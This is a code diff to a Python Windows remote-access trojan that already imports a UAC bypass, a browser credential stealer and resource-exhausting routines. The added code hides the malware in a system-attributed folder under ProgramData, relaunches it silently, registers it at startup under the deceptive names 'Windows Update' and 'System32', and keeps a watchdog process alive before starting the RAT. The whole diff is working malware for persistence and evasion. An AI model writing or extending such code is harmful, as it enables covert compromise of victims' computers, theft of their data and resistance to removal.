@@ -40,6 +40,7 @@ from _random_string import get_random_string
 from browser import Browsers
 from uacbypass import GetSelf, IsAdmin, UACbypass
 import drat
+import logging
 
 
 """"
@@ -99,6 +100,7 @@ Threadlist = []
 changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
 roaming = os.getenv("APPDATA")
 hostname = socket.gethostname()
+HIDDEN_DIR = "C:\\ProgramData\\System32Backup"
 
 if not os.path.exists(main_path):
     try:
@@ -164,7 +166,7 @@ def download_latest_script():
         print(f"[-] Error updating script: {e}")        
 
 
-check_for_updates()
+#check_for_updates()
 
 
 # ram eater
@@ -197,19 +199,71 @@ def eat_bandwidth():
 
 
 
-# add to styartup
+def is_running(process_name):
+    """Check if a process is already running."""
+    for proc in psutil.process_iter(attrs=['cmdline']):
+        try:
+            if proc.info['cmdline'] and process_name in " ".join(proc.info['cmdline']):
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            continue
+    return False
+
+def move_to_hidden_directory():
+    """Move the script to the hidden directory and restart from there."""
+    if not os.path.abspath(__file__).startswith(HIDDEN_DIR):
+        print(f"[INFO] Moving script to hidden directory: {HIDDEN_DIR}")
+        os.makedirs(HIDDEN_DIR, exist_ok=True)
+
+
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        for filename in os.listdir(script_dir):
+            source_path = os.path.join(script_dir, filename)
+            dest_path = os.path.join(HIDDEN_DIR, filename)
+            if os.path.isfile(source_path):
+                shutil.copy2(source_path, dest_path)
+
+        subprocess.run(["attrib", "+H", "+S", HIDDEN_DIR], shell=True)
+
+
+        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))
+
+        print("[INFO] Restarting from hidden directory...")
+        subprocess.Popen([pythonw_path, hidden_script_path], creationflags=subprocess.DETACHED_PROCESS)
+        sys.exit()
+
 def add_to_startup():
-    debug("Adding to startup...")
+    """Add the script to startup registry keys."""
     try:
-        script_path = os.path.abspath(__file__)
-        key = winreg.HKEY_CURRENT_USER
+        print("[INFO] Adding to startup registry...")
+
+        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))
+        system32_path = os.path.join(HIDDEN_DIR, "system32.py")
+
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(registry_key, "MyApp", 0, winreg.REG_SZ, script_path)
-        winreg.CloseKey(registry_key)
-        debug("Added to startup successfully.")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
+            winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{pythonw_path}" "{hidden_script_path}"')
+            winreg.SetValueEx(registry_key, "System32", 0, winreg.REG_SZ, f'"{pythonw_path}" "{system32_path}"')
+
+        print("[SUCCESS] Registry keys updated successfully.")
+
     except Exception as e:
-        debug(f"Error adding to startup: {e}")
+        print(f"[ERROR] Failed to add to startup: {e}")
+
+def ensure_watchdog():
+    """Ensure `system32.py` is always running."""
+    watchdog_script = os.path.join(HIDDEN_DIR, "system32.py")
+
+    if not is_running("system32.py"):
+        print("[!] Watchdog is not running. Starting it now...")
+        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+        subprocess.Popen([pythonw_path, watchdog_script], creationflags=subprocess.DETACHED_PROCESS)
+
+
+
+
 
 
 # gaming
@@ -409,10 +463,11 @@ if cc.get_browser_stealing():
         send_error_notification(e, 'Wadiyan Browser Stealer')    
 
 
-send_device_information()
+move_to_hidden_directory()
+ensure_watchdog()
 add_to_startup()
+send_device_information()
 drat.run_rat()
-
 
 
 """
